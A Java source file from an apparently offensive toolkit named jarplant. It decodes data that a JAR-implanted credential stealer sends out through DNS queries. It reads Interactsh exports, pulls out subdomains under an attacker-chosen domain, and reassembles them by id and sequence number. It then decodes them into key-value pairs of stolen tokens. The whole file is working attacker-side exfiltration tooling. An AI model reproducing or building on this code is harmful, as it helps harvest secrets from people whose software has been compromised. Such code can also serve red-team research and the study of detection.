package io.github.w1th4d.jarplant.implants.utils;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

import static io.github.w1th4d.jarplant.implants.StealerExfil.*;

public class StealerExfilDecoder {
    private final static Pattern topDomainValidator = Pattern.compile("[a-zA-Z0-9\\-.]+");
    private final String expectedTopDomain;
    private final Pattern regex;

    StealerExfilDecoder(String expectedTopDomain, Pattern regex) {
        this.expectedTopDomain = expectedTopDomain;
        this.regex = regex;
    }

    public static StealerExfilDecoder create(String expectedTopDomain) throws IOException {
        if (!topDomainValidator.matcher(expectedTopDomain).matches()) {
            throw new IOException("Invalid top domain '" + expectedTopDomain + "'.");
            // TODO Use a custom exception
        }

        /*
         * Including user input in a regex is normally a bad idea (look up "regex bombs").
         * That's why the expectedTopDomain has been validated using its own anti-regex regex. :)
         */
        Pattern regex = Pattern.compile("([a-zA-Z0-9\\-.]+\\." + expectedTopDomain.replace(".", "\\.") + ")");

        return new StealerExfilDecoder(expectedTopDomain, regex);
    }

    public Set<String> findFqdns(String text) {
        Set<String> fqdns = new HashSet<>();

        Matcher matcher = regex.matcher(text);
        while (matcher.find()) {
            if (matcher.groupCount() < 1) {
                continue;
            }
            String fqdn = matcher.group(1);
            fqdns.add(fqdn);
        }

        return fqdns;
    }

    public Set<String> parseInteractchExport(Path exportFile) throws IOException {
        return parseInteractchExport(Files.readAllBytes(exportFile));
    }

    public Set<String> parseInteractchExport(byte[] exportFileContent) throws IOException {
        return parseInteractchExport(new String(exportFileContent, StandardCharsets.UTF_8));
    }

    public Set<String> parseInteractchExport(String exportFileContent) throws IOException {
        Set<String> allFqdns = new HashSet<>();

        ObjectMapper jsonParser = new ObjectMapper();
        JsonNode json = jsonParser.readTree(exportFileContent);

        JsonNode appNode = json.get("app");
        JsonNode appJson = new ObjectMapper().readTree(appNode.asText());   // They put JSON in your JSON...
        JsonNode data = appJson.get("data");
        // Maybe some day someone needs to parse terabytes of data. Until that day, we're keeping it simple.
        for (JsonNode dataObj : data) {
            if (!dataObj.get("protocol").asText().equals("dns")) {
                continue;
            }

            JsonNode request = dataObj.get("raw-request");
            if (request != null) {
                Set<String> fqdns = findFqdns(request.asText());
                allFqdns.addAll(fqdns);
            }

            JsonNode response = dataObj.get("raw-response");
            if (response != null) {
                Set<String> fqdns = findFqdns(response.asText());
                allFqdns.addAll(fqdns);
            }
        }

        return allFqdns;
    }

    public Map<String, Map<String, String>> decodeRequests(List<String> requests) throws Exception {
        Map<String, Map<String, String>> res = new HashMap<>();
        Map<String, Map<Integer, String>> idSeqPart = new HashMap<>();

        Collections.reverse(requests);
        for (String request : requests) {
            request = request.toLowerCase();
            Pattern idRegex = Pattern.compile("([0-9]+)-([0-9]+)\\." + expectedTopDomain.replace(".", "\\."));
            Matcher idMatcher = idRegex.matcher(request);
            while (idMatcher.find()) {
                if (idMatcher.groupCount() < 2) {
                    continue;
                }
                String id = idMatcher.group(1);
                int seqNo = Integer.parseInt(idMatcher.group(2));
                Map<Integer, String> splitsForId = idSeqPart.get(id);
                if (splitsForId == null) {
                    splitsForId = new HashMap<>();
                    idSeqPart.put(id, splitsForId);
                }
                String dataPart = request.substring(0, request.indexOf("." + id + "-" + seqNo + "." + expectedTopDomain));
                String encodedData = dataPart.replace(".", "");
                String currentValueForSeqNo = splitsForId.get(seqNo);
                if (currentValueForSeqNo != null) {
                    // Collision in uniqueId+sequenceNumber detected
                    if (!currentValueForSeqNo.equals(encodedData)) {
                        // ...and the data is not the same
                        throw new Exception("Something fishy is going on");
                    }
                } else {
                    splitsForId.put(seqNo, encodedData);
                }
            }
        }

        for (Map.Entry<String, Map<Integer, String>> entry : idSeqPart.entrySet()) {
            String id = entry.getKey();
            Map<Integer, String> seq = entry.getValue();

            int seqNo = seq.keySet().stream().max(Comparator.naturalOrder()).orElseThrow();
            StringBuilder allEncodedData = new StringBuilder();
            String encoded;
            while ((encoded = seq.get(seqNo)) != null && seqNo >= 0) {
                allEncodedData.append(encoded);
                seqNo--;
            }
            String decoded = rebase(allEncodedData.toString(), URL_ALPHABET, TOKEN_ALPHABET);
            Map<String, String> structured = decoded.lines()
                    .map(line -> line.split("="))
                    .filter(splits -> splits.length == 2)
                    .collect(Collectors.toUnmodifiableMap(kv -> kv[0], kv -> kv[1]));
            res.put(id, structured);
        }

        return res;
    }
}
